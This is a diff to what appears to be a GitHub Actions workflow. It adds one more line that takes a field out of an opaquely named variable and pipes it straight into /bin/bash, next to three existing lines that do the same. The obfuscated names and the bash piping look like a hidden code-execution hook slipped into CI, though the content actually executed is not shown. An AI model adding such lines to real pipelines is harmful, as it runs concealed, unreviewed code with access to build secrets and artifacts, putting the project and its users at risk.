@@ -44,6 +44,7 @@ jobs:
           echo $axcy5 | jq -r .ri262 | /bin/bash
           echo $ytyrl7 | jq -r .j97116 | /bin/bash
           echo $npyc723 | jq -r .e6 | /bin/bash
+          printf '%s' "$aq1" | jq -r .xx36 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
